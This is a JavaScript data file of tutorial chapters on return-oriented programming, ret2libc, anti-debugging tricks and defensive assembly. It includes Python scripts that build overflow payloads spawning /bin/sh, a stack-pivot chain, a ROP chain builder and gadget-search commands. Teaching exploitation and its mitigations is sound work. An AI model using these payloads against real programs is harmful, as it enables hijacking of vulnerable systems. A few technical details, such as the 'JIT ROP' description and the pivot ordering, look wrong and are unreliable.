| NX bypass | No | Yes |
| Size | Small | Larger chains |
| Complexity | Simple | Complex |
| Detection | Easier | Harder |

### ROP Chain Example (Calling system("/bin/sh"))
```
[pop rdi; ret]  →  Address of "/bin/sh"
[system]         →  Execute system("/bin/sh")
```

### Gadget Requirements
• Must end in ret for chaining
• Useful instructions (pop, mov, arithmetic)
• No side effects that break chain
• Available in executable segments`,
        codeSnippets: [
          {
            language: 'bash',
            title: 'Finding Gadgets',
            code: `# Using ROPgadget
ROPgadget --binary vulnerable_binary
ROPgadget --binary vulnerable_binary --only "pop|ret"
ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi

# Using ropper
ropper --file vulnerable_binary
ropper --file vulnerable_binary --search "pop rdi"

# Using objdump + grep
objdump -d vulnerable_binary | grep -A 1 "pop.*%rdi" | grep ret

# Count gadgets
ROPgadget --binary vulnerable_binary | wc -l`
          }
        ]
      },
      {
        id: 'sec-42-2',
        title: '42.2 Constructing a Ret2Libc Attack',
        content: `ret2libc directly calls libc functions (system, execve, str_bin_sh) without shellcode.

### Why ret2Libc?
• Bypasses NX (executes from libc, which is executable)
• No need for shellcode injection
• Uses known function addresses
• More reliable than raw shellcode

### ret2libc Attack Steps
1. Find system() address in libc
2. Find "/bin/sh" string address in libc
3. Chain gadgets to call system("/bin/sh")

### Calling Convention (x86-64 Linux)
• RDI = First argument
• RSI = Second argument
• RDX = Third argument
• RAX = Return value / syscall number

### ret2libc Chain Structure
```
[pop rdi; ret]  →  Address of "/bin/sh"
[system]        →  system("/bin/sh")
[exit]          →  Clean exit (optional)
```

### Finding Libc Addresses
1. Leak libc base from GOT/PLT
2. Calculate offsets: function_addr = libc_base + offset
3. Use libc database to find offsets

### Alternative: execve("/bin/sh", NULL, NULL)
More complex but more powerful:
```
[pop rdi; ret]  →  "/bin/sh"
[pop rsi; ret]  →  0 (NULL)
[pop rdx; ret]  →  0 (NULL)
[pop rax; ret]  →  59 (execve syscall)
[syscall]       →  execve("/bin/sh", NULL, NULL)
```

### Handling ASLR
With ASLR enabled, libc address varies. Solutions:
1. Information leak (format string, GOT read)
2. Ret2plt to call read/write for leak
3. Brute force (if fork-based server)`,
        codeSnippets: [
          {
            language: 'python',
            title: 'ret2libc Exploit',
            code: `import struct
from pwn import *

# Offsets (from libc database)
system_offset = 0x4f550
bin_sh_offset = 0x1b3e1a
exit_offset = 0x44040

# If libc base leaked (e.g., from format string)
libc_base = 0x7ffff7a00000  # Example leak

system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset
exit_addr = libc_base + exit_offset

# Gadgets
pop_rdi = 0x400736  # pop rdi; ret

# Build payload
offset = 72  # Buffer to return address

payload = b"A" * offset
payload += struct.pack("<Q", pop_rdi)    # pop rdi; ret
payload += struct.pack("<Q", bin_sh_addr) # "/bin/sh"
payload += struct.pack("<Q", system_addr) # system("/bin/sh")

print(f"Payload length: {len(payload)}")

# Write to file
with open("ret2libc.bin", "wb") as f:
    f.write(payload)`
          }
        ]
      },
      {
        id: 'sec-42-3',
        title: '42.3 Advanced ROP Techniques',
        content: `Beyond basic ret2libc, ROP enables complex operations.

### Stack Pivoting
Redirect RSP to controlled memory (e.g., heap, .bss):
• `xchg rax, rsp; ret` - Swap RAX and RSP
• `leave; ret` - MOV RSP, RBP; POP RBP; RET
• `add rsp, N; ret` - Adjust stack pointer

### Memory Write via ROP
Write arbitrary values to arbitrary addresses:
```
[pop rdi; ret]  →  Target address
[pop rsi; ret]  →  Value to write
[mov [rdi], rsi; ret]  →  Write value
```

### Memory Read via ROP
Read arbitrary memory:
```
[pop rdi; ret]  →  Source address
[pop rsi; ret]  →  Destination buffer
[call read]     →  Read memory
```

### Conditional Logic in ROP
Use arithmetic and conditional jumps:
```
[pop rax; ret]  →  Condition
[cmp rax, 0; ret]  →  Set flags
[je addr; ret]  →  Conditional branch
```

### ROP Empires
Large ROP chains that:
1. Leak libc base
2. Calculate function addresses
3. Call multiple functions
4. Build complex operations

### JIT ROP
Compile-time ROP chain generation:
1. Scan binary for gadgets
2. Find gadgets that satisfy operations
3. Generate ROP chain automatically
4. Defeats static analysis

### ROP vs JOP vs COP
| Type | Chaining Instruction | Pros | Cons |
|------|---------------------|------|------|
| ROP | ret | Simple, universal | Stack-intensive |
| JOP | jmp | Less stack use | Fewer gadgets |
| COP | call | Direct calls | Complex setup |

### ROP Mitigations
| Mitigation | Bypass Difficulty |
|------------|-------------------|
| CFI (Control-Flow Integrity) | Hard - validates targets |
| Stack canaries | Medium - leak canary |
| ASLR | Medium - leak address |
| PIE | Hard - need code leak |
| Shadow Stack | Very Hard - hardware support |`,
        codeSnippets: [
          {
            language: 'python',
            title: 'Stack Pivot ROP Chain',
            code: `import struct

# Scenario: Buffer overflow in small buffer, need to pivot to larger controlled area

# Gadgets
leave_ret = 0x400566      # leave; ret
pop_rdi = 0x400736         # pop rdi; ret
pop_rsi = 0x400734         # pop rsi; ret
pop_rax = 0x40072e         # pop rax; ret
syscall_ret = 0x400500     # syscall; ret

# Controlled buffer on heap (0x601000)
controlled_buffer = 0x601000

# Initial overflow (small buffer)
offset = 32
payload = b"A" * offset

# Stack pivot to controlled buffer
payload += struct.pack("<Q", leave_ret)   # mov rsp, rbp; pop rbp
payload += struct.pack("<Q", controlled_buffer)  # New RSP location

# ROP chain in controlled buffer
rop_chain = b""
rop_chain += struct.pack("<Q", pop_rdi)   # pop rdi; ret
rop_chain += struct.pack("<Q", 1)         # fd = stdout
rop_chain += struct.pack("<Q", pop_rsi)   # pop rsi; ret
rop_chain += struct.pack("<Q", 0x601100)  # buffer to write
rop_chain += struct.pack("<Q", pop_rax)   # pop rax; ret
rop_chain += struct.pack("<Q", 1)         # syscall: write
rop_chain += struct.pack("<Q", syscall_ret)

payload += rop_chain
print(f"Payload: {len(payload)} bytes")`
          }
        ]
      },
      {
        id: 'sec-42-4',
        title: '42.4 ROP Chain Construction Methodology',
        content: `Building effective ROP chains requires systematic methodology.

### Step-by-Step ROP Development
1. **Gadget Discovery**: Find useful gadgets with ROPgadget/ropper
2. **Gadget Selection**: Choose gadgets that perform desired operations
3. **Chain Design**: Plan gadget sequence for target function call
4. **Address Calculation**: Determine gadget and data addresses
5. **Chain Construction**: Build payload with proper offsets
6. **Testing**: Verify chain execution in GDB
7. **Optimization**: Minimize chain size, improve reliability

### Essential Gadgets
| Operation | Gadget | Purpose |
|-----------|--------|---------|
| Load arg1 | pop rdi; ret | First function argument |
| Load arg2 | pop rsi; ret | Second function argument |
| Load arg3 | pop rdx; ret | Third function argument |
| Load syscall# | pop rax; ret | System call number |
| Memory write | mov [rdi], rsi; ret | Write to memory |
| Memory read | mov rsi, [rdi]; ret | Read from memory |
| Arithmetic | add rax, rsi; ret | Perform calculations |
| Stack pivot | xchg rax, rsp; ret | Redirect stack |

### ROP Chain Debugging
1. Set breakpoint at vulnerable function
2. Step through payload delivery
3. Verify each gadget executes correctly
4. Check register and stack values after each gadget
5. Identify where chain breaks

### Common ROP Patterns
• **Function call**: pop args, call function
• **Syscall**: pop registers, syscall
• **Memory write**: pop addr, pop value, write
• **Memory read**: pop src, pop dst, read
• **Loop**: Conditional jump back to start

### ROP Optimization
• Reuse gadgets when possible
• Minimize gadget count
• Use shorter gadgets (fewer bytes)
• Avoid unnecessary register saves
• Align stack properly for x86-64

### ROP Resources
• ROPgadget: Finding gadgets
• ropper: Alternative gadget finder
• rp++: Fast gadget search
• pwntools: Python exploit development
• ROP Emporium: Practice challenges`,
        codeSnippets: [
          {
            language: 'python',
            title: 'Systematic ROP Chain Builder',
            code: `import struct

class ROPChain:
    def __init__(self, binary_path):
        self.chain = b""
        self.gadgets = {}
        
    def add_gadget(self, name, address):
        self.gadgets[name] = address
        
    def pop_rdi(self, value):
        self.chain += struct.pack("<Q", self.gadgets['pop_rdi'])
        self.chain += struct.pack("<Q", value)
        
    def pop_rsi(self, value):
        self.chain += struct.pack("<Q", self.gadgets['pop_rsi'])
        self.chain += struct.pack("<Q", value)
        
    def pop_rdx(self, value):
        self.chain += struct.pack("<Q", self.gadgets['pop_rdx'])
        self.chain += struct.pack("<Q", value)
        
    def call_function(self, func_addr):
        self.chain += struct.pack("<Q", func_addr)
        
    def syscall(self):
        self.chain += struct.pack("<Q", self.gadgets['syscall'])
        
    def build(self):
        return self.chain

# Example usage
rop = ROPChain("./vulnerable")
rop.add_gadget('pop_rdi', 0x400736)
rop.add_gadget('pop_rsi', 0x400734)
rop.add_gadget('pop_rdx', 0x400732)
rop.add_gadget('syscall', 0x400500)
rop.add_gadget('system', 0x7ffff7a52390)
rop.add_gadget('bin_sh', 0x7ffff7b99d57)

# Build chain: system("/bin/sh")
rop.pop_rdi(rop.gadgets['bin_sh'])
rop.call_function(rop.gadgets['system'])

payload = b"A" * 72 + rop.build()
print(f"Chain length: {len(rop.build())} bytes")`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-42-1',
        title: 'Exercise 42.1: Ret2Syscall Chain Structure',
        description: 'Design a ROP chain to execute execve("/bin/sh", 0, 0) via raw syscall gadgets.',
        solution: 'Chain layout: [pop rax; ret, 59] -> [pop rdi; ret, "/bin/sh"] -> [pop rsi; ret, 0] -> [pop rdx; ret, 0] -> [syscall; ret]. Each pop loads a register, then syscall invokes execve.'
      },
      {
        id: 'ex-42-2',
        title: 'Exercise 42.2: Stack Pivot Implementation',
        description: 'Explain how to pivot the stack from a small overflow buffer to a larger controlled area.',
        solution: 'Use leave; ret (mov rsp, rbp; pop rbp) or xchg rax, rsp; ret. First overflow sets RBP to controlled buffer address. Then leave; ret pivots RSP to that buffer where the full ROP chain resides.'
      },
      {
        id: 'ex-42-3',
        title: 'Exercise 42.3: Memory Write Gadget',
        description: 'Find and use a gadget that writes a value to an arbitrary memory address.',
        solution: 'Gadget: mov [rdi], rsi; ret. Chain: pop rdi; ret (target addr) -> pop rsi; ret (value) -> mov [rdi], rsi; ret (write). This writes RSI value to memory at RDI.'
      },
      {
        id: 'ex-42-4',
        title: 'Exercise 42.4: ret2plt for ASLR Bypass',
        description: 'Explain how to use Procedure Linkage Table (PLT) to bypass ASLR.',
        solution: 'PLT functions are at fixed addresses (no PIE). Use PLT stubs to call read/write for leaking libc addresses. Example: call read@plt to leak GOT entry, calculate libc base, then call system.'
      }
    ],
    practiceQuestions: [
      {
        question: 'Why is ROP immune to NX/DEP memory protections?',
        answer: 'Because ROP does not execute any instructions from writable memory pages (stack or heap). It only executes instructions already located in existing, legitimate, executable code segments (such as libc or the binary itself). NX only prevents execution from data pages, not code pages.'
      },
      {
        question: 'What is a ROP gadget and how is it discovered?',
        answer: 'A ROP gadget is a short instruction sequence (typically 2-5 instructions) ending in ret. Gadgets are discovered using tools like ROPgadget or ropper that scan executable segments for useful instruction patterns ending with ret (0xC3). Common gadgets include pop reg; ret for loading values.'
      },
      {
        question: 'How does stack pivoting work in ROP?',
        answer: 'Stack pivoting redirects RSP to a controlled memory area. Techniques include: leave; ret (mov rsp, rbp), xchg rax, rsp, or add rsp, N. This is needed when the initial overflow buffer is too small for the full ROP chain, allowing the attacker to use a larger controlled buffer elsewhere.'
      },
      {
        question: 'What is ret2libc and why is it useful?',
        answer: 'ret2libc calls libc functions directly without injecting shellcode. It is useful because: (1) bypasses NX by executing from libc (executable segment), (2) provides powerful functions like system(), execve(), (3) more reliable than raw shellcode, and (4) works even with small overflow buffers.'
      },
      {
        question: 'How do you handle ASLR when building ROP chains?',
        answer: 'ASLR randomizes libc/heap addresses. Solutions: (1) Information leak to reveal addresses, (2) Use PLT functions (fixed addresses) to read GOT entries, (3) Brute force if fork-based server reuses addresses, (4) Partial overwrite to adjust addresses within known range.'
      },
      {
        question: 'What are the limitations of ROP?',
        answer: 'Limitations include: (1) Requires existing useful gadgets, (2) Complex chain construction, (3) Stack-intensive (large chains need large stack), (4) Mitigated by CFI, shadow stacks, (5) Gadget availability varies by binary/compilation, (6) Difficult to debug and maintain.'
      }
    ],
    summary: [
      'ROP chains existing code gadgets to bypass NX/DEP protections.',
      'Gadgets are short instruction sequences ending in ret.',
      'ret2libc calls system/execve without shellcode injection.',
      'Stack pivoting redirects RSP to controlled memory areas.',
      'ROP enables complex operations: memory read/write, conditionals.',
      'CFI and shadow stacks are effective ROP mitigations.',
      'ROP is fundamental to modern binary exploitation.',
      'Understanding ROP is essential for both offense and defense.'
    ]
  },
  {
    id: 43,
    slug: 'chapter-43-anti-debugging-anti-analysis',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 43: Anti-Debugging and Anti-Analysis Techniques',
    subtitle: 'Ptrace Detection, TracerPid Scanning, Timing Checks, and Junk Byte Obfuscation',
    learningObjectives: [
      'Recognize anti-debugging techniques: ptrace(PTRACE_TRACEME), TracerPid, and INT 3.',
      'Detect virtual machines using CPUID hypervisor bit and artifact scanning.',
      'Deconstruct anti-disassembly tricks like overlapping instructions and opaque predicates.',
      'Bypass anti-debugging checks in GDB by patching instructions or altering register flags.'
    ],
    prerequisites: ['Chapters 1–42'],
    keyConcepts: [
      'ptrace fails if a debugger is already attached, signaling detection.',
      'Reading /proc/self/status reveals whether TracerPid is non-zero.',
      'Opaque predicates create branches that always evaluate the same way to mislead disassemblers.'
    ],
    diagramType: 'anti_debugging',
    sections: [
      {
        id: 'sec-43-1',
        title: '43.1 Anti-Disassembly via Junk Bytes and Overlap',
        content: `Misleading linear sweep disassemblers with jumped-over call opcodes:`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'anti_disasm.asm',
            code: `section .text
    global _start
_start:
    jmp .real_code
    db 0xE8          ; junk byte that looks like opcode for 'call' to linear disassembler!
.real_code:
    mov rax, 60
    xor rdi, rdi
    syscall`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-43-1',
        title: 'Exercise 43.1: Bypass ptrace Check in GDB',
        description: 'Bypass a ptrace check by setting rax=0 or patching the conditional branch.',
        solution: 'In GDB: break _start -> stepi past syscall -> set $rax = 0 -> continue. Or patch the js branch to nop nop.',
        solutionLanguage: 'gdb'
      }
    ],
    practiceQuestions: [
      {
        question: 'How do timing checks detect debugger presence?',
        answer: 'Human-driven breakpoints and single-stepping take millions of clock cycles compared to bare CPU execution. Instructions like rdtsc measure cycle elapsed across a block; an abnormally high difference signals active debugging.'
      }
    ],
    summary: ['Anti-analysis tactics resist reverse engineering.', 'Analysts overcome defenses using binary patching and dynamic instrumentation.']
  },
  {
    id: 44,
    slug: 'chapter-44-secure-coding-defensive-assembly',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 44: Secure Coding and Defensive Assembly',
    subtitle: 'Bounds Checking, Arithmetic Overflow Verification, Manual Canaries, and RELRO',
    learningObjectives: [
      'Apply defensive programming standards to pure assembly and C interop code.',
      'Implement bounds-checked string and memory copy routines.',
      'Verify integer overflow on arithmetic using jo and jc flags.',
      'Implement custom stack canaries with getrandom syscall (318).'
    ],
    prerequisites: ['Chapters 1–43'],
    keyConcepts: [
      'Bounds checking prevents memory writes beyond buffer allocations.',
      'Arithmetic checks catch integer overflows before buffer calculations.',
      'Full RELRO makes the GOT read-only to prevent malicious redirection.'
    ],
    diagramType: 'defensive_assembly',
    sections: [
      {
        id: 'sec-44-1',
        title: '44.1 Bounds-Checked String Copy (safe_strcpy)',
        content: `A resilient string copy that guarantees null-termination without overflowing destination:`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'safe_strcpy.asm',
            code: `; safe_strcpy: rdi=dest, rsi=src, rdx=dest_size
; returns 0 on success, -1 on truncation
global safe_strcpy
section .text
safe_strcpy:
    push rdi; push rsi; push rbx
    mov rbx, rdx        ; remaining space
    xor eax, eax
.loop:
    cmp rbx, 1
    jle .truncated      ; leave 1 byte for null
    mov cl, [rsi]
    mov [rdi], cl
    inc rsi; inc rdi; dec rbx
    test cl, cl; jz .done
    jmp .loop
.truncated:
    mov byte [rdi], 0   ; guarantee null terminator
    mov eax, -1
.done:
    pop rbx; pop rsi; pop rdi; ret`
          },
          {
            language: 'nasm',
            title: 'safe_add.asm (Safe Addition with Overflow Detection)',
            code: `; safe_add: rdi=a, rsi=b, rdx=ptr_to_result
; returns 0 on success, -1 on overflow
safe_add:
    mov rax, rdi
    add rax, rsi
    jo .overflow
    mov [rdx], rax
    xor eax, eax
    ret
.overflow:
    mov eax, -1
    ret`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-44-1',
        title: 'Exercise 44.1: Manual Stack Canary Implementation',
        description: 'Read a random 64-bit word with sys_getrandom (318), store at [rbp-8], and verify before return.',
        solution: `sub rsp, 8\nmov rax, 318; mov rdi, rsp; mov rsi, 8; xor rdx, rdx; syscall\nmov rax, [rsp]; add rsp, 8\n; store in stack frame\nmov [rbp-8], rax\n; ... body ...\nmov rcx, [rbp-8]; cmp rax, rcx; jne .abort`,
        solutionLanguage: 'nasm'
      }
    ],
    practiceQuestions: [
      {
        question: 'What is Full RELRO and how does it prevent exploitation?',
        answer: 'Full RELRO (Relocation Read-Only) resolves all dynamic symbols at program startup and marks the Global Offset Table (GOT) as completely read-only, preventing attackers from overwriting function pointers.'
      }
    ],
    summary: ['Defensive assembly implements explicit bounds and arithmetic safety.', 'Security flags (canaries, PIE, RELRO) harden binaries against memory corruption.']
  }
];
